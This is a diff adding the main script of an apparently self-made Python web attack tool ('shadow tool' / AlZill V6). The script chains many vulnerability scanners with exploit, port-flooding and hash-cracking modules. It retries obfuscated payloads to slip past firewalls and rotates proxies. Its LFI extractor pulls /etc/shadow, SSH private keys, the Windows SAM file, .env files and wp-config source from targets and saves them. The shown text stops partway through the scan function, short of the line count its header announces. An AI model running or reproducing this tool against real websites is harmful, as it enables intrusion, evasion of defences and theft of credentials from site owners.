@@ -1,0 +1,1092 @@
+#!/usr/bin/env python3
+import argparse
+import requests
+import importlib.util
+import os
+import re
+import time
+import sys
+import json
+import socket
+import hashlib
+from io import StringIO
+from termcolor import cprint
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# ============================================================
+# Banner
+# ============================================================
+def banner():
+    cprint(r"""
+   
+  _____.             _               _              _ 
+ / ___|| |__   __ _  __| | _____      __ | |_ ___   ___ | |
+ \___ \| '_ \ / _` |/ _` |/ _ \ \ /\ / / | __/ _ \ / _ \| |
+  ___) | | | | (_| | (_| | (_) \ V  V /  | || (_) | (_) | | | |
+ |____/|_| |_|\__,_|\__,_|\___/ \_/\_/    \__\___/ \___/|_| | |
+                                      
+====================================
+      [shadow tool] The tool was developed by a Yemeni beginner student specializing in how to find vulnerabilities, sensitive information, and weaknesses in websites. [Warning: It is not recommended to modify the tool's code. There is software that prevents any modification to the tool.]
+    """, "cyan")
+
+banner()
+
+# ============================================================
+# Imports
+# ============================================================
+from scanner_engine import AlZillEngine
+
+# ============================================================
+# Smart Modules for Evasion and Analysis
+# ============================================================
+try:
+    from modules.obfuscator import AlZillObfuscator
+    from modules.smart_analyzer import SmartResponseAnalyzer
+    from modules.json_injector import JSONInjector
+    from modules.sqli_data_extractor import run_custom_extractor, save_leaked_data
+    SMART_MODULES_AVAILABLE = True
+    cprint("[+] Smart evasion modules loaded successfully", "green")
+except ImportError as e:
+    cprint(f"[!] Smart modules import warning: {e}", "yellow")
+    SMART_MODULES_AVAILABLE = False
+    AlZillObfuscator = None
+    SmartResponseAnalyzer = None
+    JSONInjector = None
+    run_custom_extractor = None
+    save_leaked_data = None
+
+from modules import (
+    header_analyzer, admin_panel_finder, csrf_checker, jwt_token_analyzer,
+    xss_scanner, xss_post_scanner, sqli_scanner, sqli_post_scanner,
+    lfi_scanner, cmdi_scanner, open_redirect_scanner, js_analyzer, js_scanner,
+    dns_scanner, dns_exploit, results_analyzer, message_fetcher,
+    exploit_sqli, exploit_xss, exploit_lfi, exploit_cmdi, exploit_csrf,
+    exploit_redirect, exploit_ssrf, ip_inspector, ip_port_scanner,
+    port_analyzer, network_scanner, extended_analyzer, multi_lang_scanner,
+    bash_scanner, php_scanner, ruby_scanner, java_scanner, input_monitor,
+    hash_cracker, port_flooder, proxy_handler, ssrf_scanner, attack_logic,
+    cookie_analyzer
+)
+
+try:
+    from modules import deep_crawler
+except Exception:
+    try:
+        from modules import eep_crawler as deep_crawler
+    except Exception:
+        deep_crawler = None
+
+try:
+    from modules.new_core.session_manager import SessionManager
+    from modules.new_core.csrf_helper import has_csrf_token
+    from modules.new_core.decoder_utils import deep_inspect_and_clean
+    from modules.new_core.enhanced_sqli import check_sqli_by_comparison
+    from modules.new_core.enhanced_xss import check_reflected
+    from modules.new_core.form_parser import extract_forms
+    from modules.new_core.verify_stored_xss import verify_stored
+except Exception as e:
+    cprint(f"[!] New core modules import warning: {e}", "yellow")
+    SessionManager = None
+    has_csrf_token = None
+    deep_inspect_and_clean = None
+    check_sqli_by_comparison = None
+    check_reflected = None
+    extract_forms = None
+    verify_stored = None
+
+try:
+    from modules.waf_detector import WAFDetector
+    from modules.bypass_engine import run_bypass_strategies
+except Exception as e:
+    cprint(f"[!] WAF/Bypass modules import warning: {e}", "yellow")
+    WAFDetector = None
+    run_bypass_strategies = None
+
+try:
+    from modules import whois_scanner, hash_analyzer, extract_tokens, domain_info_scanner
+except Exception as e:
+    whois_scanner = None
+    hash_analyzer = None
+    extract_tokens = None
+    domain_info_scanner = None
+
+try:
+    from modules.infra_scanner import auto_scan_infrastructure
+except Exception as e:
+    cprint(f"[!] Infrastructure scanner import warning: {e}", "yellow")
+    auto_scan_infrastructure = None
+
+# ============================================================
+# Proxy Manager Import
+# ============================================================
+try:
+    from modules.proxy_manager import ProxySession, ProxyManager
+    PROXY_MANAGER_AVAILABLE = True
+    cprint("[+] Proxy Manager loaded successfully", "green")
+except ImportError as e:
+    PROXY_MANAGER_AVAILABLE = False
+    cprint(f"[!] Proxy Manager not available: {e}", "yellow")
+
+detected_vulns = []
+scanned_domains = set()
+proxy_session = None
+scan_results_summary = {
+    'target': '',
+    'timestamp': '',
+    'vulnerabilities': [],
+    'total_vulnerabilities': 0,
+    'modules_executed': []
+}
+
+
+# ============================================================
+# LFI Data Extractor - Extract sensitive files (محسن)
+# ============================================================
+def extract_lfi_files(url, vulnerable_params, session, verbose=False):
+    """
+    Extract sensitive files when LFI vulnerability is confirmed
+    Saves each file separately in lfi_extracted/ directory
+    """
+    cprint(f"\n[LFI Extractor] Extracting sensitive files...", "cyan")
+    
+    # Common sensitive files to extract (موسعة)
+    sensitive_files = [
+        # Linux files
+        '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/hostname',
+        '/etc/hosts', '/etc/issue', '/etc/os-release', '/etc/debian_version',
+        '/etc/redhat-release', '/proc/self/environ', '/proc/self/cmdline',
+        '/proc/self/status', '/var/log/apache2/access.log',
+        '/var/log/apache2/error.log', '/var/log/nginx/access.log',
+        '/var/log/nginx/error.log', '/var/log/auth.log', '/var/log/syslog',
+        '/root/.bash_history', '/home/*/.bash_history', '/root/.ssh/id_rsa',
+        '/root/.ssh/authorized_keys', '/etc/ssh/sshd_config',
+        '/etc/mysql/my.cnf', '/etc/nginx/nginx.conf', '/etc/apache2/apache2.conf',
+        '/etc/php.ini', '/etc/php/php.ini',
+        
+        # PHP filters for source code extraction
+        'php://filter/convert.base64-encode/resource=config.php',
+        'php://filter/convert.base64-encode/resource=.env',
+        'php://filter/convert.base64-encode/resource=db.php',
+        'php://filter/convert.base64-encode/resource=wp-config.php',
+        'php://filter/convert.base64-encode/resource=../config.php',
+        'php://filter/convert.base64-encode/resource=../.env',
+        'php://filter/convert.base64-encode/resource=../db.php',
+        'php://filter/convert.base64-encode/resource=../../config.php',
+        'php://filter/convert.base64-encode/resource=../../.env',
+        
+        # Windows files
+        'C:\\Windows\\win.ini', 'C:\\Windows\\system.ini',
+        'C:\\Windows\\System32\\drivers\\etc\\hosts',
+        'C:\\Windows\\System32\\config\\sam',
+        'C:\\boot.ini', 'C:\\xampp\\apache\\conf\\httpd.conf',
+        'C:\\xampp\\php\\php.ini', 'C:\\xampp\\mysql\\bin\\my.ini',
+        
+        # Application files
+        '../.env', '../.git/config', '../config.php', '../db.php',
+        '../wp-config.php', '../settings.py', '../.htaccess', '../web.config'
+    ]
+    
+    extracted_files = []
+    os.makedirs("lfi_extracted", exist_ok=True)
+    
+    # Parse URL once for reuse (IMPROVED)
+    parsed_url = urlparse(url)
+    original_params = parse_qs(parsed_url.query)
+    
+    for file_path in sensitive_files:
+        try:
+            # Build URL using proper URL parsing (محسن)
+            current_params = original_params.copy()
+            for param in vulnerable_params:
+                if param in current_params:
+                    current_params[param] = [file_path]
+                else:
+                    current_params[param] = file_path
+            
+            # Rebuild URL safely
+            query_string = urlencode(current_params, doseq=True)
+            test_url = parsed_url._replace(query=query_string).geturl()
+            
+            if verbose:
+                cprint(f"[*] Trying to extract: {file_path}", "blue")
+            
+            response = session.get(test_url, timeout=10, verify=False)
+            
+            # Check if file was successfully retrieved
+            if response.status_code == 200 and len(response.text) > 50:
+                # Check if response contains actual file content (not HTML error page)
+                if not any(error in response.text.lower() for error in ['<!doctype html', '<html', '404 not found', '403 forbidden']):
+                    # Generate safe filename
+                    safe_filename = file_path.replace('/', '_').replace('\\', '_').replace('..', '').lstrip('_')
+                    save_path = f"lfi_extracted/{safe_filename}.txt"
+                    
+                    with open(save_path, 'w', encoding='utf-8') as f:
+                        f.write(f"Source: {file_path}\n")
+                        f.write(f"URL: {test_url}\n")
+                        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                        f.write("="*60 + "\n\n")
+                        f.write(response.text)
+                    
+                    extracted_files.append({
+                        'path': file_path,
+                        'saved_as': save_path,
+                        'size': len(response.text)
+                    })
+                    
+                    cprint(f"    [+] Extracted: {file_path} -> {save_path}", "green")
+                    
+        except Exception as e:
+            if verbose:
+                cprint(f"    [!] Failed to extract {file_path}: {e}", "yellow")
+    
+    # Save summary to lfi_leaks.txt
+    if extracted_files:
+        summary_file = "lfi_leaks.txt"
+        with open(summary_file, 'a', encoding='utf-8') as f:
+            f.write(f"\n{'='*60}\n")
+            f.write(f"Target: {url}\n")
+            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"Files extracted: {len(extracted_files)}\n")
+            f.write(f"{'='*60}\n")
+            for item in extracted_files:
+                f.write(f"  - {item['path']} -> {item['saved_as']} ({item['size']} bytes)\n")
+        
+        cprint(f"\n[+] LFI extraction completed! {len(extracted_files)} files saved to lfi_extracted/", "green")
+        cprint(f"[+] Summary saved to: {summary_file}", "green")
+    else:
+        cprint("[!] No sensitive files could be extracted", "yellow")
+    
+    return extracted_files
+
+
+# ============================================================
+# Link Extraction Functions (Filtered by target domain)
+# ============================================================
+def extract_links_from_text(text, base_url=None, target_domain=None):
+    links = set()
+    for match in re.findall(r'(?:href|src)=["\']([^"\']+)["\']', text, flags=re.IGNORECASE):
+        links.add(match)
+    for match in re.findall(r'https?://[^\s\'"<>)]+', text, flags=re.IGNORECASE):
+        links.add(match)
+    
+    if base_url:
+        normalized = set()
+        for l in links:
+            try:
+                full = urljoin(base_url, l)
+                if full.startswith("http://") or full.startswith("https://"):
+                    if target_domain:
+                        parsed = urlparse(full)
+                        link_domain = parsed.netloc.lower()
+                        if target_domain in link_domain or link_domain in target_domain:
+                            normalized.add(full)
+                    else:
+                        normalized.add(full)
+            except Exception:
+                continue
+        return list(normalized)
+    
+    return [l for l in links if l.startswith("http://") or l.startswith("https://")]
+
+
+def extract_domains_from_links(links, target_url=None):
+    target_domain = None
+    if target_url:
+        parsed = urlparse(target_url)
+        target_domain = parsed.netloc.lower()
+        if target_domain.startswith('www.'):
+            target_domain = target_domain[4:]
+    
+    domains = set()
+    for link in links:
+        try:
+            parsed = urlparse(link)
+            domain = parsed.netloc.lower()
+            if domain:
+                clean_domain = domain[4:] if domain.startswith('www.') else domain
+                clean_target = target_domain[4:] if target_domain and target_domain.startswith('www.') else target_domain
+                
+                if not target_domain:
+                    domains.add(domain)
+                elif clean_domain == clean_target or clean_domain.endswith('.' + clean_target):
+                    if domain not in scanned_domains:
+                        domains.add(domain)
+        except Exception:
+            continue
+    return list(domains)
+
+
+def scan_infrastructure_for_domains(domains, verbose=False):
+    if not auto_scan_infrastructure:
+        if verbose:
+            cprint("[!] Infrastructure scanner not available", "yellow")
+        return
+    
+    for domain in domains:
+        if domain in scanned_domains:
+            continue
+        
+        cprint(f"\n[*] Auto-scanning infrastructure for: {domain}", "magenta", attrs=['bold'])
+        try:
+            data = auto_scan_infrastructure(domain)
+            if data:
+                scanned_domains.add(domain)
+                cprint(f"    [✓] Infrastructure scan completed", "green")
+                if verbose:
+                    cprint(f"        • Target: {data.get('target', 'N/A')}", "cyan")
+                    cprint(f"        • IP: {data.get('ip', 'N/A')}", "cyan")
+                    cprint(f"        • Type: {data.get('identity', 'N/A')}", "cyan")
+                    cprint(f"        • Time: {data.get('timestamp', 'N/A')}", "cyan")
+            else:
+                if verbose:
+                    cprint(f"    [✗] No data returned for {domain}", "yellow")
+        except Exception as e:
+            if verbose:
+                cprint(f"    [✗] Infrastructure scan failed for {domain}: {e}", "red")
+
+
+def save_links_to_file(links, out_path):
+    os.makedirs(os.path.dirname(out_path), exist_ok=True)
+    with open(out_path, "w", encoding="utf-8") as f:
+        for u in sorted(set(links)):
+            f.write(u + "\n")
+    return out_path
+
+
+def start_intelligent_scan(target):
+    print(f"\n" + "="*50)
+    print(f" [AlZill V6] Intelligent Security Scan Starting...")
+    print(f" Target: {target}")
+    print("="*50)
+
+    try:
+        if WAFDetector:
+            detector = WAFDetector(target)
+            waf_name = detector.run()
+            
+            if waf_name:
+                print(f"\n[!]   {waf_name} DETECTED! Switching to BYPASS MODE...")
+                print(f"[*] Activating advanced evasion techniques...")
+                
+                if run_bypass_strategies:
+                    run_bypass_strategies(target, waf_name)
+                else:
+                    print(f"[X] Bypass engine not available. Falling back to standard scan...")
+                    engine = AlZillEngine(target)
+                    engine.start_scanning()
+            else:
+                print(f"\n[+]  No WAF detected. Running standard engine...")
+                print(f"[*] Launching full security assessment...")
+                engine = AlZillEngine(target)
+                engine.start_scanning()
+        else:
+            print(f"\n[!] WAFDetector not available. Running standard engine directly...")
+            engine = AlZillEngine(target)
+            engine.start_scanning()
+            
+    except Exception as e:
+        print(f"\n[X] Engine Error: {e}")
+        print(f"[!] Falling back to basic scanner...")
+        try:
+            engine = AlZillEngine(target)
+            engine.start_scanning()
+        except:
+            print(f"[X] Critical error: Could not initialize any scanner.")
+
+    print("\n" + "="*50)
+    print(f" Intelligent Scan Process Finished.")
+    print("="*50)
+
+
+def start_al_zill_scan(target_url):
+    start_intelligent_scan(target_url)
+
+
+def safe_call(fn, *a, **kw):
+    global proxy_session
+    try:
+        # Pass proxy session to module if it supports it
+        if proxy_session and hasattr(fn, 'scan'):
+            kw['proxy_session'] = proxy_session
+        result = fn(*a, **kw)
+        if result and isinstance(result, dict) and 'vulnerabilities' in result:
+            return result
+        return result
+    except Exception as e:
+        verbose = kw.get('verbose', False)
+        if verbose:
+            cprint(f"[MODULE ERROR] {fn.__name__ if hasattr(fn,'__name__') else 'module'}: {e}", "red")
+        return None
+
+
+# ============================================================
+# Enhanced Smart Request with WAF Detection and Obfuscation
+# ============================================================
+def smart_request(session, url, data=None, json_data=None, param_name=None, payload=None, verbose=False):
+    """
+    Smart request handler with:
+    1. WAF detection from headers
+    2. Adaptive obfuscation based on WAF type
+    3. Time-based payload verification
+    """
+    if not SMART_MODULES_AVAILABLE:
+        if json_data:
+            return session.post(url, json=json_data, timeout=10, verify=False)
+        return session.post(url, data=data, timeout=10, verify=False)
+    
+    # STEP 1: Detect WAF from headers (if AlZillObfuscator available)
+    detected_waf = None
+    if AlZillObfuscator:
+        try:
+            # Send a benign request first to detect WAF
+            test_resp = session.get(url, timeout=5, verify=False)
+            detected_waf = AlZillObfuscator.detect_waf_from_headers(test_resp.headers)
+            if detected_waf and verbose:
+                cprint(f"[*] Detected WAF: {detected_waf}", "yellow")
+        except:
+            pass
+    
+    # STEP 2: Send the actual request
+    if json_data:
+        response = session.post(url, json=json_data, timeout=10, verify=False)
+    else:
+        response = session.post(url, data=data, timeout=10, verify=False)
+    
+    # STEP 3: Analyze response
+    action = SmartResponseAnalyzer.analyze(response)
+    
+    # STEP 4: Handle WAF detection (OBFUSCATE)
+    if action == "OBFUSCATE" and payload:
+        if verbose:
+            cprint(f"[*] WAF detected! Retrying with obfuscated payload...", "yellow")
+        
+        # Apply obfuscation with WAF-specific techniques
+        if AlZillObfuscator:
+            if detected_waf:
+                new_payload = AlZillObfuscator.super_obfuscate(payload, waf_type=detected_waf)
+            else:
+                new_payload = AlZillObfuscator.super_obfuscate(payload)
+        else:
+            new_payload = payload
+        
+        # Send obfuscated request
+        if json_data:
+            new_json = JSONInjector.inject(json_data, param_name, new_payload) if json_data else {param_name: new_payload}
+            response = session.post(url, json=new_json, timeout=10, verify=False)
+        else:
+            new_data = {param_name: new_payload} if data else {param_name: new_payload}
+            response = session.post(url, data=new_data, timeout=10, verify=False)
+        
+        # STEP 5: Verify time-based payloads (SLEEP, WAITFOR)
+        if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'pg_sleep' in payload.lower():
+            elapsed = response.elapsed.total_seconds()
+            if verbose:
+                cprint(f"[*] Time-based payload response time: {elapsed:.2f}s", "blue")
+            
+            # Extract expected delay from payload
+            expected_delay = 0
+            delay_match = re.search(r'SLEEP\((\d+)\)|WAITFOR DELAY \'00:00:(\d+)\'|pg_sleep\((\d+)\)', payload, re.IGNORECASE)
+            if delay_match:
+                expected_delay = int(delay_match.group(1) or delay_match.group(2) or delay_match.group(3) or 0)
+            
+            if expected_delay > 0 and elapsed >= expected_delay * 0.8:
+                if verbose:
+                    cprint(f"[+] Time-based injection confirmed! Delay: {elapsed:.2f}s (expected {expected_delay}s)", "green")
+        
+        # Check if obfuscation succeeded
+        if SmartResponseAnalyzer.is_success(response):
+            if verbose:
+                cprint(f"[+] Obfuscation successful!", "green")
+            return response
+        
+        # STEP 6: Second attempt with medium obfuscation
+        if AlZillObfuscator and verbose:
+            cprint(f"[*] Second attempt with medium obfuscation...", "yellow")
+            new_payload = AlZillObfuscator.medium_obfuscate(payload)
+            if json_data:
+                new_json = JSONInjector.inject(json_data, param_name, new_payload)
+                response = session.post(url, json=new_json, timeout=10, verify=False)
+            else:
+                new_data = {param_name: new_payload}
+                response = session.post(url, data=new_data, timeout=10, verify=False)
+    
+    # STEP 7: Handle JSON injection
+    elif action == "USE_JSON" and payload:
+        if verbose:
+            cprint(f"[*] Switching to JSON injection...", "yellow")
+        
+        json_data = JSONInjector.inject({}, param_name, payload)
+        response = session.post(url, json=json_data, timeout=10, verify=False)
+    
+    return response
+
+
+def save_final_report(target_url, host):
+    """Save unified final report"""
+    os.makedirs("reports", exist_ok=True)
+    
+    # JSON Report
+    json_report = {
+        'target': target_url,
+        'timestamp': datetime.now().isoformat(),
+        'total_vulnerabilities': len(detected_vulns),
+        'vulnerabilities': detected_vulns,
+        'modules_executed': scan_results_summary.get('modules_executed', [])
+    }
+    
+    json_path = f"reports/report_{host}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    with open(json_path, 'w', encoding='utf-8') as f:
+        json.dump(json_report, f, indent=2, ensure_ascii=False)
+    
+    # Text Report
+    txt_path = f"reports/report_{host}.txt"
+    with open(txt_path, 'w', encoding='utf-8') as f:
+        f.write("="*60 + "\n")
+        f.write(f"AlZill V6 Pro Security Scan Report\n")
+        f.write(f"Target: {target_url}\n")
+        f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+        f.write("="*60 + "\n\n")
+        
+        if detected_vulns:
+            f.write(f"Total Vulnerabilities Found: {len(detected_vulns)}\n\n")
+            for i, vuln in enumerate(detected_vulns, 1):
+                f.write(f"[{i}] {vuln.get('type', 'Unknown')}\n")
+                f.write(f"    Parameter: {vuln.get('parameter', 'N/A')}\n")
+                f.write(f"    Severity: {vuln.get('severity', 'Unknown')}\n")
+                f.write(f"    Payload: {vuln.get('payload', 'N/A')[:100]}\n")
+                f.write(f"    URL: {vuln.get('url', target_url)}\n\n")
+        else:
+            f.write("No vulnerabilities were detected.\n")
+    
+    cprint(f"\n[+] Final report saved to: {json_path}", "green")
+    cprint(f"[+] Text report saved to: {txt_path}", "green")
+
+
+def scan_target(url, verbose=False, messages_url=None, deep_scan=False, delay=1.5, 
+                auto_infra=True, run_attack=False, use_proxy=False, proxy_file=None):
+    global detected_vulns, proxy_session
+    detected_vulns = []
+    scan_results_summary['target'] = url
+    scan_results_summary['timestamp'] = datetime.now().isoformat()
+
+    # ============================================================
+    # Initialize Proxy Session if enabled
+    # ============================================================
+    if use_proxy and PROXY_MANAGER_AVAILABLE:
+        try:
+            proxy_session = ProxySession(verbose=verbose)
+            if proxy_session and proxy_session.proxy_manager.get_proxy_count() > 0:
+                cprint(f"[+] Proxy mode enabled with {proxy_session.proxy_manager.get_proxy_count()} proxies", "green")
+                cprint(f"[*] Proxies will rotate automatically every 30 seconds or 15 requests", "cyan")
+            else:
+                cprint("[!] No proxies available, running without proxy", "yellow")
+                use_proxy = False
+                proxy_session = None
+        except Exception as e:
+            cprint(f"[!] Failed to initialize proxy: {e}", "yellow")
+            use_proxy = False
+            proxy_session = None
+    elif use_proxy and not PROXY_MANAGER_AVAILABLE:
+        cprint("[!] Proxy Manager not available. Install modules/proxy_manager.py", "yellow")
+        use_proxy = False
+
+    start_intelligent_scan(url)
+
+    cprint(f"[+] Launching Scan: {url}\n", "cyan", attrs=['bold'])
+    time.sleep(1)
+
+    if whois_scanner:
+        try:
+            whois_scanner.scan(url, verbose=verbose)
+            scan_results_summary['modules_executed'].append('whois_scanner')
+        except Exception as e:
+            if verbose:
+                cprint(f"[WHOIS ERROR] {e}", "red")
+
+    sm = None
+    if SessionManager:
+        try:
+            sm = SessionManager(timeout=8, delay=delay, max_retries=2)
+        except Exception as e:
+            if verbose:
+                cprint(f"[!] SessionManager init failed: {e}", "red")
+
+    try:
+        if sm:
+            resp = sm.get(url)
+            page_content = resp.text or ""
+        else:
+            resp = requests.get(url, timeout=10)
+            page_content = resp.text or ""
+    except Exception as e:
+        cprint(f"[!] Failed to fetch {url}: {e}", "red")
+        page_content = ""
+
+    if sm and deep_inspect_and_clean:
+        cprint("[*] Phase: Deep decoding (silent)...", "magenta")
+        try:
+            old_stdout = sys.stdout
+            sys.stdout = StringIO()
+            deep_inspect_and_clean(sm, url, page_content, verbose=False)
+            sys.stdout = old_stdout
+        except Exception as e:
+            if verbose:
+                cprint(f"[DECODER ERROR] {e}", "red")
+
+    if sm:
+        if check_sqli_by_comparison:
+            try:
+                check_sqli_by_comparison(sm, url, verbose=False, delay=delay)
+            except Exception:
+                pass
+        if check_reflected:
+            try:
+                check_reflected(sm, url, verbose=False, delay=delay)
+            except Exception:
+                pass
+
+    # ============================================================
+    # UPDATED MODULE CALLS WITH VULNERABILITY COLLECTION
+    # ============================================================
+    
+    try:
+        result = header_analyzer.scan(url, verbose)
+        if result and isinstance(result, dict) and result.get('vulnerabilities'):
+            detected_vulns.extend(result['vulnerabilities'])
+        scan_results_summary['modules_executed'].append('header_analyzer')
+    except Exception as e:
+        if verbose:
+            cprint(f"[HEADER ANALYZER ERROR] {e}", "red")
+
+    # Admin Panel Finder
+    result = safe_call(admin_panel_finder.scan, url, verbose)
+    if result and isinstance(result, list):
+        for panel in result:
+            detected_vulns.append({
+                'type': 'Admin Panel Exposure',
+                'url': panel.get('url'),
+                'severity': 'Medium'
+            })
+    scan_results_summary['modules_executed'].append('admin_panel_finder')
+
+    # CSRF Checker
+    result = safe_call(csrf_checker.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerable_forms'):
+        for form in result['vulnerable_forms']:
+            detected_vulns.append({
+                'type': 'Missing CSRF Protection',
+                'location': form.get('action'),
+                'severity': 'Medium'
+            })
+    scan_results_summary['modules_executed'].append('csrf_checker')
+
+    # JWT Analyzer
+    result = safe_call(jwt_token_analyzer.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('jwt_token_analyzer')
+
+    # XSS Scanner (Pro version)
+    result = safe_call(xss_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('xss_scanner')
+
+    # XSS POST Scanner
+    result = safe_call(xss_post_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('xss_post_scanner')
+
+    # SQLi Scanner
+    result = safe_call(sqli_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('sqli_scanner')
+
+    # SQLi POST Scanner
+    result = safe_call(sqli_post_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('sqli_post_scanner')
+
+    # LFI Scanner
+    result = safe_call(lfi_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('lfi_scanner')
+
+    # CMDi Scanner
+    result = safe_call(cmdi_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('cmdi_scanner')
+
+    # Open Redirect Scanner
+    result = safe_call(open_redirect_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('open_redirect_scanner')
+
+    # JS Analyzer
+    result = safe_call(js_analyzer.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('js_analyzer')
+
+    # JS Scanner
+    result = safe_call(js_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('js_scanner')
+
+    # Results Analyzer
+    result = safe_call(results_analyzer.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('results_analyzer')
+
+    # Multi Language Scanner
+    result = safe_call(multi_lang_scanner.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('multi_lang_scanner')
+
+    # Cookie Analyzer
+    result = safe_call(cookie_analyzer.scan, url, verbose)
+    if result and isinstance(result, dict) and result.get('vulnerabilities'):
+        detected_vulns.extend(result['vulnerabilities'])
+    scan_results_summary['modules_executed'].append('cookie_analyzer')
+
+    # ============================================================
+    # FORM PARSER & CSRF CHECK
+    # ============================================================
+    if sm and extract_forms and has_csrf_token:
+        try:
+            forms = extract_forms(page_content, url, verbose=False)
+            vulnerable_forms = []
+            for i, form in enumerate(forms):
+                if not has_csrf_token(form, verbose=False):
+                    vulnerable_forms.append(f"Form #{i+1} at {form['action']}")
+            if vulnerable_forms:
+                cprint(f"[!] {len(vulnerable_forms)} form(s) lack CSRF protection", "yellow")
+                for vf in vulnerable_forms[:3]:
+                    cprint(f"    - {vf}", "yellow")
+                    detected_vulns.append({
+                        'type': 'Missing CSRF Protection',
+                        'location': vf,
+                        'severity': 'Medium'
+                    })
+        except Exception as e:
+            if verbose:
+                cprint(f"[FORM PARSER ERROR] {e}", "red")
+
+    # ============================================================
+    # STORED XSS VERIFICATION
+    # ============================================================
+    if verify_stored:
+        try:
+            verify_stored(url, sm, verbose=False)
+        except Exception:
+            pass
+
+    # ============================================================
+    # CODE SCANNERS (Bash, PHP, Ruby, Java)
+    # ============================================================
+    try:
+        if bash_scanner.scan_bash_code(page_content):
+            detected_vulns.append({
+                'type': 'Bash Command Injection Risk',
+                'severity': 'High',
+                'location': 'Inline code'
+            })
+        if php_scanner.scan_php_code(page_content, verbose=verbose):
+            detected_vulns.append({
+                'type': 'PHP Code Injection Risk',
+                'severity': 'High',
+                'location': 'Inline code'
+            })
+        if ruby_scanner.scan_ruby_code(page_content, verbose=verbose):
+            detected_vulns.append({
+                'type': 'Ruby Code Injection Risk',
+                'severity': 'High',
+                'location': 'Inline code'
+            })
+        if java_scanner.scan_java_code(page_content, "inline.java", verbose=verbose):
+            detected_vulns.append({
+                'type': 'Java Code Injection Risk',
+                'severity': 'High',
+                'location': 'Inline code'
+            })
+    except Exception as e:
+        if verbose:
+            cprint(f"[CODE SCANNER ERROR] {e}", "red")
+
+    safe_call(extended_analyzer.scan, url, verbose)
+    safe_call(input_monitor.run_input_monitor, url)
+
+    # ============================================================
+    # TOKEN EXTRACTION
+    # ============================================================
+    if extract_tokens and page_content:
+        try:
+            tokens = extract_tokens.extract(page_content)
+            if tokens and verbose:
+                cprint(f"[+] Extracted {len(tokens)} tokens", "green")
+        except Exception:
+            pass
+
+    # ============================================================
+    # HASH ANALYZER
+    # ============================================================
+    if hash_analyzer and page_content:
+        try:
+            hash_analyzer.analyze(page_content)
+        except Exception:
+            pass
+
+    # ============================================================
+    # DOMAIN INFO SCANNER
+    # ============================================================
+    if domain_info_scanner:
+        try:
+            domain_info_scanner.get_domain_info(url)
+        except Exception as e:
+            if verbose:
+                cprint(f"[DOMAIN INFO ERROR] {e}", "red")
+
+    # ============================================================
+    # LINK EXTRACTION & DOMAIN DISCOVERY
+    # ============================================================
+    discovered_domains = []
+    if page_content and auto_infra:
+        try:
+            parsed_target = urlparse(url)
+            target_domain = parsed_target.netloc.lower()
+            if target_domain.startswith('www.'):
+                target_domain = target_domain[4:]
+            
+            links = extract_links_from_text(page_content, base_url=url, target_domain=target_domain)
+            if links:
+                discovered_domains = extract_domains_from_links(links, target_url=url)
+                if discovered_domains and verbose:
+                    cprint(f"[+] Found {len(discovered_domains)} new domains in page links", "green")
+        except Exception as e:
+            if verbose:
+                cprint(f"[LINK EXTRACTION ERROR] {e}", "red")
+
+    # ============================================================
+    # NETWORK SCANNING
+    # ============================================================
+    try:
+        host = url.split("//")[-1].split("/")[0]
+        ip_inspector.scan_ip(host, verbose=verbose, save_to_file=True)
+        ip_port_scanner.scan(url, verbose)
+        port_analyzer.analyze_ports(host, [21, 22, 80, 443, 3306])
+        network_scanner.scan(verbose)
+    except Exception as e:
+        if verbose:
+            cprint(f"[NETWORK SCAN ERROR] {e}", "red")
+
+    # ============================================================
+    # MESSAGE FETCHER
+    # ============================================================
+    if messages_url:
+        try:
+            msgs = message_fetcher.fetch_messages(messages_url)
+            if msgs:
+                cprint("\n[+] Messages Found:", "cyan")
+                for msg in msgs[:5]:
+                    print(f"- {msg}")
+        except Exception as e:
+            if verbose:
+                cprint(f"[MESSAGE FETCH ERROR] {e}", "red")
+
+    # ============================================================
+    # DNS SCANNER
+    # ============================================================
+    safe_call(dns_scanner.scan, url, verbose)
